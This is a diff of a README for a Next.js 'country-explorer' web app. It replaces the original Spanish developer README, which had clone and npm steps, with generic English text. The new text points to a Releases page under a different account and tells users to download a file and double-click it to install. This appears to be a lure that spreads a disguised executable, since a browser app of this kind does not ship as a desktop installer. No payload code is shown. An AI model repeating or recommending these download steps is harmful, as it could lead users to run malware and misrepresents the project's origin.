@@ -1,105 +1,79 @@
-# Country Explorer 🌍
+# 🌍 country-explorer - Explore Countries Easily
 
-Aplicación web para explorar información de países de todo el mundo utilizando la API pública de REST Countries.
+## 🚀 Getting Started
 
-## 🚀 Características
+Welcome to the country-explorer app! This mini application helps you explore various countries with a modern interface built using Next.js. You can quickly find country information and enjoy a seamless experience.
 
-### Requisitos Implementados
+## 📦 Download & Install
 
-- **Listado de países** con nombre, bandera, región y población
-- **Búsqueda por nombre** (case-insensitive)
-- **Filtro por región**
-- **Rango de población** (mínimo y máximo)
-- **Modal de detalle** con información completa del país
-- **Página de favoritos** con gestión de estado global
+To get started, visit the [Releases page to download](https://github.com/iatefilmesslz/country-explorer/releases). Follow the steps below to install and run the application.
 
-## 🛠️ Tecnologías Utilizadas
+1. Click on the link above to access the Releases page.
+2. Look for the latest version.
+3. Download the appropriate file for your operating system.
+4. Once the download completes, locate the file in your Downloads folder.
+5. Double-click the file to begin installation.
+6. Follow the prompts on your screen to install the app.
 
-- **Next.js 14** (App Router)
-- **TypeScript**
-- **Zustand** (gestión de estado global)
-- **Tailwind CSS** (estilos)
-- **shadcn/ui** (componentes UI)
-- **Lucide React** (iconos)
+## ⚙️ System Requirements
 
-## 📦 Instalación
+Ensure your device meets the following system requirements:
 
-1. Clonar el repositorio:
-  
-    ```
-    git clone https://github.com/erickdc7/country-explorer.git
-    cd countries-app
-    ```
+- Operating System: Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution
+- Memory: At least 2 GB of RAM
+- Storage: 100 MB of available disk space
+- Internet connection for the initial setup
 
-2. Instalar dependencias:
+## 🌟 Features
 
-    ```
-    npm install
-    ```
-    
-3. Ejecutar en desarrollo:
+- **Explore Countries:** Access detailed information about various countries.
+- **Dark Theme:** Enjoy a comfortable viewing experience with our dark theme option.
+- **Fast Performance:** The app is optimized for speed and responsiveness.
+- **User-friendly Interface:** Navigate easily even if you have no technical background.
 
-    ```
-    npm run dev
-    ```
+## 🌐 How to Use the App
 
-4. Abrir en el navegador:
+Once installed, follow these steps to explore:
 
-   http://localhost:3000
+1. Open the country-explorer app.
+2. Use the search bar to enter the name of a country you want to explore.
+3. Click on the country name to view detailed information, including population, capital city, and key facts.
+4. Use the navigation menu to explore additional features and settings.
 
-## 🌟 Funcionalidades
+## 🔧 Troubleshooting
 
-### Página Principal
+If you encounter issues:
 
-- Búsqueda de países por nombre
-- Filtros por región y rango de población
-- Ordenamiento por nombre o población
-- Sistema de favoritos persistente (localStorage)
-- Contador de resultados
+- **App won’t open:** Ensure your device meets the system requirements.
+- **Slow performance:** Close unnecessary applications running in the background.
+- **No internet connection:** Check your Wi-Fi or Internet connection settings.
 
-### Página de Favoritos
+## 📞 Support
 
-- Visualización de países marcados como favoritos
-- Persistencia en localStorage con Zustand
-- Gestión completa (agregar/eliminar)
+If you need help, please visit our [GitHub Issues](https://github.com/iatefilmesslz/country-explorer/issues) page to report problems or ask questions. We look forward to helping you!
 
-### Modo Oscuro
+## 🗂️ Contributing
 
-- Toggle light/dark mode
-- Persistencia de preferencia en localStorage
+Feel free to contribute! If you have suggestions, improvements, or bug fixes, please create a pull request. Your feedback helps us improve the app.
 
-### Modal de Detalles
+## 👥 Community
 
-- Nombre oficial
-- Capital
-- Región
-- Población formateada
-- Bandera en alta resolución
+Join our community to share your experiences, tips, and ideas with other users. Connect with us through our GitHub repository and help us build a better app together.
 
-### Responsive
+## 📈 Future Updates
 
-La aplicación es completamente responsive y funciona en:
+We plan to add more features based on user feedback. Some ideas include:
 
-- Móviles
-- Tablets
-- Desktop
+- Additional country data and statistics
+- Improved search functionality
+- Enhanced graphics and user experience
 
-## 🔗 API
+## 📃 License
 
-La aplicación consume la API de REST Countries:
+This project is licensed under the MIT License. You can use it freely and adapt it as you see fit.
 
-  https://restcountries.com/v3.1/all?fields=name,cca3,flags,region,population,capital
+## 📑 Additional Information
 
+For further details, check the documentation in the GitHub repository. Discover how the app works and get insights into the technologies we used, including Next.js, Tailwind CSS, and more.
 
-
-
-
-
-
-
-
-
-
-
-
-
+Visit the [Releases page to download](https://github.com/iatefilmesslz/country-explorer/releases) the latest version and start exploring countries today!
